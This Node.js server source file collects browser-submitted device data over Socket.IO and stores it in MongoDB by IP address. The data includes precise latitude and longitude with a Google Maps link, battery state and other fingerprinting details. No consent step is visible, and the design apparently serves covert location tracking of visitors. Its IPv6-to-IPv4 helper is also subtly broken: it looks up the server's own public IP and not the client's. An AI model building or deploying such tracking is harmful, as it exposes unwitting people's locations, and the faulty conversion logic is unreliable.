const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const mongoose = require('mongoose');
const axios = require('axios');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

const PORT = process.env.PORT || 3000;
const path = require('path');

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// MongoDB Connection
const mongoURI = process.env.MONGO_URI;
mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("✅ Connected to MongoDB"))
    .catch(err => console.error("❌ MongoDB connection error:", err));

// Define Schema
const DeviceDataSchema = new mongoose.Schema({
    ip: { type: String, required: true },
    latitude: { type: String, required: true },
    longitude: { type: String, required: true },
    mapsLink: { type: String, required: true },
    screenResolution: { type: String },
    platform: { type: String },
    browser: { type: String },
    batteryLevel: { type: String, default: "Unknown" },
    chargingStatus: { type: String, default: "Unknown" },
    touchSupport: { type: Boolean },
    orientation: { type: String },
    language: { type: String },
    timezone: { type: String },
    darkMode: { type: Boolean },
    deviceMemory: { type: String },
    timestamp: { type: Date, default: Date.now }
});

const DeviceData = mongoose.model("DeviceData", DeviceDataSchema);

io.on('connection', (socket) => {
    console.log("🔗 Client Connected:", socket.id);

    socket.on("deviceData", async (data) => {
        try {
            console.log("📥 Received Data:", data);

            // Convert IPv6 to IPv4
            const ip = data.ip.includes(':') ? await getIPv4(data.ip) : data.ip;

            // Check if record exists (Update instead of Insert)
            const existingRecord = await DeviceData.findOne({ ip });

            if (existingRecord) {
                await DeviceData.updateOne(
                    { ip },
                    {
                        $set: {
                            latitude: data.latitude,
                            longitude: data.longitude,
                            mapsLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
                            screenResolution: data.screenResolution,
                            platform: data.platform,
                            browser: data.browser,
                            batteryLevel: data.batteryLevel || "Unknown",
                            chargingStatus: data.chargingStatus || "Unknown",
                            touchSupport: data.touchSupport,
                            orientation: data.orientation,
                            language: data.language,
                            timezone: data.timezone,
                            darkMode: data.darkMode,
                            deviceMemory: data.deviceMemory,
                            timestamp: new Date()
                        }
                    }
                );
                console.log("✅ Data updated successfully");
            } else {
                const newDeviceData = new DeviceData({
                    ip,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    mapsLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
                    screenResolution: data.screenResolution,
                    platform: data.platform,
                    browser: data.browser,
                    batteryLevel: data.batteryLevel || "Unknown",
                    chargingStatus: data.chargingStatus || "Unknown",
                    touchSupport: data.touchSupport,
                    orientation: data.orientation,
                    language: data.language,
                    timezone: data.timezone,
                    darkMode: data.darkMode,
                    deviceMemory: data.deviceMemory
                });
                await newDeviceData.save();
                console.log("✅ New Data saved successfully");
            }
        } catch (error) {
            console.error("❌ Error saving data:", error);
        }
    });

    socket.on("disconnect", () => console.log("❌ Client Disconnected:", socket.id));
});

async function getIPv4(ipv6) {
    try {
        const response = await axios.get(`https://api64.ipify.org?format=json`);
        return response.data.ip;
    } catch (error) {
        console.error("❌ Error converting IPv6 to IPv4:", error);
        return ipv6; // Fallback to original if conversion fails
    }
}

server.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
